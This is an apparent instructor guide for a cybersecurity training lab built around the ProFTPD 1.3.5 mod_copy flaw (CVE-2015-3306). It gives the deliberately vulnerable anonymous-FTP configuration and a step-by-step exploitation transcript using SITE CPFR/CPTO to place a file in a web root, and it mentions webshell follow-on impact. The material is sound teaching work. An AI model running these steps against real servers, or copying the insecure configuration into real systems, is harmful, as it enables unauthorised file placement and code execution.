# AP-02 Instructor Guide

## Purpose

AP-02 is the second verified CAV-CSF attack path. It provides a genuine, version-bound service vulnerability (CVE-2015-3306, ProFTPD 1.3.5 `mod_copy`) rather than another configuration-only weakness, and links a network file-transfer service directly to web-service compromise.

This guide contains solution information and must not be issued as the student brief.

## Implemented Path

```text
Anonymous FTP login on TCP 2121 (ProFTPD 1.3.5, mod_copy)
  -> SITE CPFR / SITE CPTO abuse the daemon's own www-data identity
  -> arbitrary file placed inside the AP-02 web root
  -> file served (and would execute, if PHP) by Apache on TCP 80
```

AP-01 vsftpd on TCP 21, teaching SSH on TCP 22 and administrative SSH on TCP 22222 are unaffected and must remain available throughout.

## Prerequisites

- The CAV-CSF VM is attached only to the approved isolated teaching network.
- A fresh VMware snapshot exists before any instructor-controlled exploit acceptance run.
- Instructor administration uses TCP 22222 and an SSH key.
- The student or Kali system can reach the VM on TCP 2121 and TCP 80.
- `sudo ./scripts/verify-ap02.sh` returns `RESULT: PASS`.

## Student Starting Information

Provide:

- the authorised target VM address, or the subnet if host discovery is an assessed objective;
- assessment evidence and reporting requirements;
- the lab rules of engagement.

Do not provide the vulnerable ProFTPD version in advance; students are expected to fingerprint it themselves. Provide `docs/ap02-student-lab.md` as the student brief — it includes generic tool/command explanations (nmap version scan, FTP raw-command mode via `quote`, curl with a custom `Host` header) but deliberately does not name the specific `SITE CPFR`/`SITE CPTO` commands or confirm that anonymous access is the working vector; identifying both is part of the exercise.

## Architecture Note: Anonymous Access Requirement

The original AP-02 design (`docs/ap02-design.md`) intended that the ProFTPD daemon's `User www-data` / `Group www-data` directives would cause file operations to run as `www-data`, allowing `mod_copy` to write into the `www-data`-owned web root. Live exploit acceptance testing on 3 August 2026 showed this is **only true for anonymous sessions** — a named login (e.g. `stockroom`, reused from AP-01) authenticates fine but is set-uid to its own account, and `SITE CPTO` correctly fails with `550 Permission denied` against the `www-data:www-data 0750` web root.

`scripts/install-ap02.sh` was updated to add the missing `<Anonymous>` context so the intended condition actually exists:

```
<Anonymous /var/www/brightleaf-ap02>
  User                www-data
  Group               www-data
  UserAlias           anonymous www-data
  RequireValidShell   off
  <Limit LOGIN>
    AllowAll
  </Limit>
</Anonymous>
```

This chroots anonymous sessions to the web root and runs them as `www-data`, matching the classic CVE-2015-3306 demonstration and the impact described in the design doc. See `docs/decisions.md` for the recorded decision.

Secondary finding: `stockroom`'s AP-01 credentials also authenticate against AP-02 on TCP 2121 (ProFTPD falls back to reading `/etc/shadow` directly, since the build uses `--disable-auth-pam`). That session runs as `stockroom`, so `mod_copy` still works but is confined to paths `stockroom` can already write (e.g. `/tmp`) — it cannot reach the web root. This is a real, teachable credential-reuse observation but is **not** the AP-02 headline path; do not present it as equivalent to the anonymous route.

## Expected Route

1. TCP 2121 exposes ProFTPD 1.3.5 (`nmap -sV`).
2. `mod_copy` is present, so the version is checked against known CVEs, identifying CVE-2015-3306.
3. Anonymous FTP login succeeds (no credentials required).
4. `SITE CPFR` / `SITE CPTO` copy an existing file (e.g. `index.php`) to a new name inside the same web-accessible directory.
5. The copied file is fetched over HTTP, proving arbitrary file placement in a web-servable, potentially PHP-executable location.

### Live-Tested Exploitation Transcript

Executed end-to-end from a Kali attacker VM against the reference CAV-CSF VM (`192.168.200.137`) on 3 August 2026, as an approved instructor-controlled validation pass, immediately after the `<Anonymous>` config fix above.

**1. Recon** (shared with AP-01 — see that guide's transcript): `nmap` identifies `2121/tcp open ftp ProFTPD 1.3.5` and `80/tcp open http Apache httpd 2.4.66 ((Ubuntu))`.

**2. Anonymous login and mod_copy abuse**

```text
$ ftp 192.168.200.137 2121
Connected to 192.168.200.137.
220 ProFTPD 1.3.5 Server (Brightleaf Document Transfer) [192.168.200.137]
Name (192.168.200.137:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
ftp> quote SITE CPFR index.php
350 File or directory exists, ready for destination name
ftp> quote SITE CPTO proof.php
250 Copy successful
ftp> quit
```

**3. Confirming impact over HTTP**

```text
$ curl -s -H "Host: warehouse.brightleaf.test" http://192.168.200.137/proof.php
<!doctype html>
...
  <h1>Brightleaf Warehouse Document Service</h1>
...
```

The copied file is served identically to the original `index.php`, confirming an anonymous, unauthenticated FTP session placed an arbitrary file into the live web root. A real attacker would instead copy an already-uploaded file containing a PHP payload to a `.php` destination name to obtain code execution; this guide stops at the non-destructive proof, consistent with the project's controlled-proof approach used in AP-01.

## Instructor Validation

Run from the repository root through administrative SSH on TCP 22222:

```bash
sudo ./scripts/verify-ap02.sh
```

This checks deployment/configuration health only (binary version, `mod_copy` presence, config parse, service/port state, coexistence with AP-01/teaching-SSH/admin-SSH). It deliberately does not run the exploit — exploit acceptance testing (as captured above) is a separate, explicit instructor-controlled phase and should not be run against a student-facing instance without a fresh snapshot.

## Reset Between Uses

Run:

```bash
sudo ./scripts/reset-ap02.sh
```

Reset wipes everything under the AP-02 web root and reinstalls the source-controlled `index.php`, restores ownership/permissions, restarts AP-02's services, and runs verification. It does not touch AP-01, SSH configuration, administrator data, or the ProFTPD binary/configuration — the vulnerable condition (pinned version, `mod_copy`, anonymous access) persists across resets by design; only session-created files are cleared.

## Troubleshooting

### Anonymous login is refused

Confirm the `<Anonymous>` block is present in `/etc/cav-csf/ap02/proftpd.conf` and that `sudo ./scripts/install-ap02.sh` has been run since the block was added. Check `proftpd -t -c /etc/cav-csf/ap02/proftpd.conf` for a syntax error.

### `SITE CPTO` returns `550 Permission denied`

This means the session did not assume the `www-data` identity — most likely a named (non-anonymous) login was used, or the `<Anonymous>` context path doesn't match `$WEB_ROOT`. Named logins (e.g. `stockroom`) are expected to fail here; this is not a bug.

### Copied file does not appear over HTTP

Confirm the `Host: warehouse.brightleaf.test` header is present in the request — the AP-02 vhost is name-based and will 404 without it. Confirm Apache is active and the web root ownership matches `www-data:www-data:750`.

### Recovery is uncertain

Keep the TCP 22222 administrative session open. If reset cannot restore the path safely, revert to a known-good VMware snapshot.

## Marking Guidance

Evidence should demonstrate the complete reasoning chain rather than only the final file placement. Suggested areas are:

- accurate service fingerprinting and version identification;
- correct identification of CVE-2015-3306 and its precondition (anonymous access assuming the daemon's own identity);
- clean, non-destructive demonstration of arbitrary file placement;
- correct explanation of why the destination directory's ownership matters;
- discussion of the realistic follow-on impact (webshell upload, RCE) without requiring students to actually deploy one unless explicitly scoped;
- risk explanation and remediation quality (e.g. disabling anonymous access, upgrading ProFTPD, restricting `mod_copy`, separating FTP and web-server identities).

Stronger submissions should discuss why this is a genuine software vulnerability rather than a configuration mistake, and how it differs in nature from AP-01's sudo misconfiguration.
